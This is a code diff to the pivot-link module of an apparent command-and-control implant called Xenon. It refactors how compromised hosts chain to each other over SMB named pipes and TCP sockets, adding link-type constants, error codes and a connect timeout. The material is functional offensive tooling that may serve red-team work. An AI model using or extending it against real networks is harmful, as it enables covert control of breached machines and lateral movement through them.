@@ -26,16 +26,17 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
     }
 
     UINT32 LinkType = ParserGetInt32(arguments);
-    _dbg("\t\t Type of Link %s", (LinkType == 1) ? "SMB" : "TCP");
+    
+    _dbg("\t\t Type of Link %s", (LinkType == LINKTYPE_SMB) ? "SMB" : "TCP");
 
     /* Output */
     PVOID  outBuf = NULL;
     SIZE_T outLen = 0;
     UINT32 LinkId = 0;
-    DWORD Result = 0;
+    DWORD  Result = 0;
 
     // SMB Link
-    if (LinkType == 1)
+    if ( LinkType == LINKTYPE_SMB )
     {
         SIZE_T pipeLen      = 0;
         PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);
@@ -52,7 +53,7 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
             goto END;
         }
     }
-    else // TCP Link
+    else  // TCP Link
     {
         SIZE_T TargetLen    = 0;
         PCHAR  Target       = ParserGetString(arguments, &TargetLen);
@@ -61,11 +62,11 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
         _dbg("Adding Link Agent for TCP %s:%d", Target, TcpPort);
 
         /* Connect to Pivot Agent and Read First Message */
-        
-        if ( !LinkAddTcp(taskUuid, Target, TcpPort, &outBuf, &outLen, &LinkId) ) 
+
+        Result = LinkAddTcp(taskUuid, Target, TcpPort, &outBuf, &outLen, &LinkId);
+        if ( Result != 0 ) 
         {
             _err("Failed to link tcp agent.");
-            Result = GetLastError();
             PackageError(taskUuid, Result);
             goto END;
         }
@@ -149,7 +150,7 @@ BOOL LinkAddSmb( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, 
         LinkData->hPipe           = hPipe;
         LinkData->Next            = NULL;
         LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);
-        LinkData->LinkType        = 1; // SMB Link Type
+        LinkData->LinkType        = LINKTYPE_SMB; // SMB Link Type
         
 
         strncpy(LinkData->TaskUuid, TaskUuid, strlen(TaskUuid));
@@ -160,13 +161,13 @@ BOOL LinkAddSmb( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, 
         *LinkId = LinkData->LinkId;
 
         /* Link */
-        if ( !xenonConfig->SmbLinks )
+        if ( !xenonConfig->Links )
         {
-            xenonConfig->SmbLinks = LinkData;
+            xenonConfig->Links = LinkData;
         }
         else
         {
-            PLINKS LinksList = xenonConfig->SmbLinks;
+            PLINKS LinksList = xenonConfig->Links;
 
             do
             {
@@ -193,37 +194,42 @@ BOOL LinkAddSmb( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, 
 /**
  * @brief Add a new TCP pivot link to Agent.
  * 
- * @return BOOL  
+ * @return DWORD Status  
  */
-BOOL LinkAddTcp( PCHAR TaskUuid, PCHAR Target, UINT32 TcpPort, PVOID* outBuf, SIZE_T* outLen, UINT32* LinkId)
+DWORD LinkAddTcp( PCHAR TaskUuid, PCHAR Target, UINT32 TcpPort, PVOID* outBuf, SIZE_T* outLen, UINT32* LinkId)
 {
-    PLINKS LinkData    = NULL;
-    u_long mode = 0;
+    PLINKS LinkData = NULL;
+    u_long mode     = 0;
+    DWORD Status    = 0;
     WSADATA wsaData;
+
 
     if (WSAStartup(514, &wsaData)) 
     {
-		_err("[LINK] WSAStartup Error: %d", WSAGetLastError());
+		Status = WSAGetLastError();
+        _err("[LINK] WSAStartup Error: %d", Status);
 		WSACleanup();
-        return FALSE;
+        return Status;
 	}
 
     _dbg("[LINK] WSAStartup OK");
     SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
     if (sock == SOCKET_ERROR)
     {
-        _err("[LINK] WSASocketA Error: %d", GetLastError());
+        Status = GetLastError();
+        _err("[LINK] WSASocketA Error: %d", Status);
         WSACleanup();
-        return FALSE;
+        return Status;
     }
     _dbg("[LINK] WSASocketA OK");
     struct hostent* host = gethostbyname(Target);
     if(!host)
     {
+        Status = GetLastError();
         _err("[LINK] Cannot resolv hostname: %s", Target);
 		WSACleanup();
         closesocket(sock);
-        return FALSE;
+        return Status;
     }
     _dbg("[LINK] gethostbyname OK");
 
@@ -233,31 +239,45 @@ BOOL LinkAddTcp( PCHAR TaskUuid, PCHAR Target, UINT32 TcpPort, PVOID* outBuf, SI
     socketAddress.sin_port = htons(TcpPort);
     if (ioctlsocket(sock, FIONBIO, &mode) == SOCKET_ERROR)
     {
-        _err("[LINK] ioctlsocket Error: %d", GetLastError());
+        Status = GetLastError();
+        _err("[LINK] ioctlsocket Error: %d", Status);
 		WSACleanup();
         closesocket(sock);
-        return FALSE;
+        return Status;
     }
 
     if (connect(sock, (struct sockaddr*)&socketAddress, 16) == SOCKET_ERROR )
     {
-        _err("[LINK] connect Error: %d", GetLastError());
+        Status = GetLastError();
+        _err("[LINK] connect Error: %d", Status);
 		WSACleanup();
         closesocket(sock);
-        return FALSE;
+        return Status;
     }
     _dbg("[LINK] connect OK");
 
     /* Read the initial buffer */
+    DWORD ConnectTimeout = 300;     // 30s
+    DWORD Elapsed        = 0;
     while ( *outLen < sizeof( UINT32 ) )
     {
+        // Timeout - if TCP port is open but not giving a package
+        if ( Elapsed >= ConnectTimeout )
+        {
+            Status = ERROR_LINK_CONNECT_TIMEOUT;
+            _err("Failed to connect to TCP Link. ERROR : ERROR_LINK_CONNECT_TIMEOUT");
+            return Status;
+        }
+
         if ( !PackageReadTcp(sock, outBuf, outLen) )
         {
-            _err("Failed to read initial buffer from socket. ERROR : %d", GetLastError());
-            return FALSE;
+            Status = GetLastError();
+            _err("Failed to read initial buffer from socket. ERROR : %d", Status);
+            return Status;
         }
 
         /* Parent was faster than Link, wait for data */
+        Elapsed++;
         Sleep(100);
     }
 
@@ -270,22 +290,22 @@ BOOL LinkAddTcp( PCHAR TaskUuid, PCHAR Target, UINT32 TcpPort, PVOID* outBuf, SI
         LinkData->LinkSocket      = sock;
         LinkData->Next            = NULL;
         LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);
-        LinkData->LinkType        = 2; // TCP Link Type
+        LinkData->LinkType        = LINKTYPE_TCP; // TCP Link Type
         
 
         strncpy(LinkData->TaskUuid, TaskUuid, strlen(TaskUuid));
-        _dbg("Parsed SMB Link ID => [%x] \n", LinkData->LinkId);
+        _dbg("Parsed TCP Link ID => [%x] \n", LinkData->LinkId);
         
         *LinkId = LinkData->LinkId;
 
         /* Link */
-        if ( !xenonConfig->SmbLinks )
+        if ( !xenonConfig->Links )
         {
-            xenonConfig->SmbLinks = LinkData;
+            xenonConfig->Links = LinkData;
         }
         else
         {
-            PLINKS LinksList = xenonConfig->SmbLinks;
+            PLINKS LinksList = xenonConfig->Links;
 
             do
             {
@@ -306,7 +326,7 @@ BOOL LinkAddTcp( PCHAR TaskUuid, PCHAR Target, UINT32 TcpPort, PVOID* outBuf, SI
         }
     }
 
-    return TRUE;
+    return Status;
 }
 
 /**
@@ -340,7 +360,7 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
     _dbg("[LINK SYNC] Received P2P Response with args: \n\tIsCheckin: %s \n\tLinkId: %x \n\tP2P UUID: %s \n\tP2PMsg: %d bytes", IsCheckin ? "TRUE" : "FALSE", LinkId, P2pUuid, MsgLen);
 
     /* Find Correct Link and Sync Data */
-    PLINKS Current = xenonConfig->SmbLinks;
+    PLINKS Current = xenonConfig->Links;
     PLINKS Prev    = NULL;
 
     while ( Current )
@@ -369,16 +389,16 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
         {
             _dbg("[LINK SYNC] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);
 
-            /* TODO - This is a temporary solution, need to find a better way to handle this 
-             *        Check if the pipe is full, sadly we will lose this Msg if it is */
             DWORD BytesAvailable = 0;
             DWORD BytesRemaining = 0;
-            if (Current->LinkType == 1) // SMB
+            if ( Current->LinkType == LINKTYPE_SMB ) // SMB
             {
                 if ( PeekNamedPipe(Current->hPipe, NULL, 0, NULL, &BytesAvailable, &BytesRemaining) )
                 {
                     if ( BytesAvailable >= sizeof( UINT32 ) + PIPE_BUFFER_MAX )
                     {
+                        /* TODO - This is a temporary solution, need to find a better way to handle this 
+                         *  Check if the pipe is full, sadly we will lose this Msg if it is */
                         _dbg("Pipe is full, skipping message. Available write space: %d bytes", BytesRemaining);
                         goto CLEANUP;
                     }
@@ -424,7 +444,7 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
                 }
                 else
                 {
-                    if ( GetLastError() == SOCKET_ERROR )
+                    if ( WSAGetLastError() == WSAENOTSOCK )
                     {
                         _err("Socket error, removing P2P Agent %s...", Current->AgentId);
                         LinkRemove(Current->AgentId);
@@ -436,7 +456,6 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
                         PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);      // PCHAR: Parent Agent UUID
                         PackageAddBytes(locals, Current->AgentId, TASK_UUID_SIZE, FALSE);          // PCHAR: P2P Agent UUID
                         PackageAddInt32(locals, Current->LinkType);                                // UINT32: Link Type - SMB or TCP
-                        
                         PackageQueue(locals);
 
                         goto CLEANUP;
@@ -481,7 +500,7 @@ CLEANUP:
 VOID LinkPush()
 {
     PPackage    Package   = NULL;
-    PLINKS      TempList  = xenonConfig->SmbLinks;
+    PLINKS      TempList  = xenonConfig->Links;
     DWORD       BytesSize = 0;
     DWORD       Length    = 0;
     PVOID       Output    = NULL;
@@ -500,7 +519,7 @@ VOID LinkPush()
         if ( !TempList )
             break;
 
-        if ( (TempList->hPipe) && (TempList->LinkType == 1) )
+        if ( (TempList->hPipe) && (TempList->LinkType == LINKTYPE_SMB) )
         {
             NumLoops = 0;
             do {
@@ -521,7 +540,6 @@ VOID LinkPush()
                         PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);       // PCHAR: Parent Agent UUID
                         PackageAddBytes(locals, TempList->AgentId, TASK_UUID_SIZE, FALSE);          // PCHAR: P2P Agent UUID
                         PackageAddInt32(locals, TempList->LinkType);                                // UINT32: Link Type - SMB or TCP
-                        
                         PackageQueue(locals);
                     }
                     
@@ -558,7 +576,6 @@ VOID LinkPush()
                 PackageAddString(Package, TempList->AgentId, FALSE);
                 PackageAddInt32(Package, TempList->LinkType);
                 PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);
-
                 PackageQueue(Package);
 
                 /* Clean up */
@@ -572,7 +589,7 @@ VOID LinkPush()
             } while ( NumLoops < MAX_SMB_PACKETS_PER_LOOP );
         }
 
-        if ( (TempList->LinkSocket) && (TempList->LinkType == 2) )
+        if ( (TempList->LinkSocket) && (TempList->LinkType == LINKTYPE_TCP) )
         {
             NumLoops = 0;
             do {
@@ -580,7 +597,7 @@ VOID LinkPush()
                 /* Use PackageReadPipe to read entire package */
                 if ( !PackageReadTcp(TempList->LinkSocket, &Output, &OutLen) )
                 {
-                    if ( GetLastError() == SOCKET_ERROR )
+                    if ( WSAGetLastError() == WSAENOTSOCK )
                     {
                         _err("Socket error, removing P2P Agent %s...", TempList->AgentId);
                         
@@ -593,7 +610,6 @@ VOID LinkPush()
                         PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);       // PCHAR: Parent Agent UUID
                         PackageAddBytes(locals, TempList->AgentId, TASK_UUID_SIZE, FALSE);          // PCHAR: P2P Agent UUID
                         PackageAddInt32(locals, TempList->LinkType);                                // UINT32: Link Type - SMB or TCP
-                        
                         PackageQueue(locals);
                     }
                     
@@ -630,7 +646,6 @@ VOID LinkPush()
                 PackageAddString(Package, TempList->AgentId, FALSE);
                 PackageAddInt32(Package, TempList->LinkType);
                 PackageAddBytes(Package, Temp.Buffer, Temp.Length, TRUE);
-
                 PackageQueue(Package);
 
                 /* Clean up */
@@ -663,7 +678,7 @@ UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
     // Value  = ParserStringCopy(&Parser, &uuidLen);
     Value = ParserGetInt32(&Parser);
 
-    _dbg("Parsed SMB Link ID => %x \n", Value);
+    _dbg("Parsed Link ID => %x \n", Value);
 
     ParserDestroy(&Parser);
 
@@ -677,7 +692,7 @@ UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
  */
 BOOL LinkRemove( PCHAR P2pUuid )
 {
-    PLINKS Current = xenonConfig->SmbLinks;
+    PLINKS Current = xenonConfig->Links;
     PLINKS Prev    = NULL;
 
     while ( Current )
@@ -686,19 +701,23 @@ BOOL LinkRemove( PCHAR P2pUuid )
 
         if ( strcmp(Current->AgentId, P2pUuid) == 0 )
         {
+            if ( Current->AgentId ) LocalFree(Current->AgentId);
+
+            /* SMB */
             if ( Current->hPipe ) CloseHandle(Current->hPipe);
             if ( Current->PipeName ) LocalFree(Current->PipeName);
-            if ( Current->AgentId ) LocalFree(Current->AgentId);
+            
+            /* TCP */
             if ( Current->LinkSocket ) 
             {
                 _dbg("Close LinkSocket => %x \n", Current->LinkSocket);
-                shutdown(Current->LinkSocket,2);
+                shutdown(Current->LinkSocket, 2);
                 closesocket(Current->LinkSocket);
             }
 
             /* Update linked list */
             if ( Prev == NULL )
-                xenonConfig->SmbLinks = Next;
+                xenonConfig->Links = Next;
             else
                 Prev->Next = Next;
 
@@ -748,7 +767,7 @@ BOOL LinkRemove( PCHAR P2pUuid )
 
     _dbg("Unlinking P2P Agent [%s]", P2pUuid);
 
-    PLINKS Current = xenonConfig->SmbLinks;
+    PLINKS Current = xenonConfig->Links;
     while ( Current )
     {
         PLINKS Next = Current->Next;
@@ -776,7 +795,6 @@ BOOL LinkRemove( PCHAR P2pUuid )
     PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);      // PCHAR:               Parent Agent UUID
     PackageAddBytes(locals, P2pUuid, TASK_UUID_SIZE, FALSE);                   // PCHAR:               P2P Agent UUID
     PackageAddInt32(locals, LinkType);                                         // UINT32:              Link Type - SMB or TCP
-    
     PackageQueue(locals);
 
     return;
